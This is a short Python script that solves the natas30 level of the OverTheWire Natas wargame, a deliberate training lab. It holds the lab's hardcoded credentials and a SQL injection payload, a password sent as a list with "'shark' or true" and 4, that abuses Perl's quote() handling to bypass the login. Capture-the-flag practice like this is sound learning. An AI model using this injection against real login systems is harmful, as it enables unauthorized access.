Perl

```
#!/usr/bin/env python
import requests

username = 'natas30'
password = 'WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH'

url = 'http://%s.natas.labs.overthewire.org/index.pl' % username

session = requests.Session()

response = session.post(url, data={"username":"natas31", "password":["'shark' or true",4]}, auth=(username,password))
print(response.text)
```
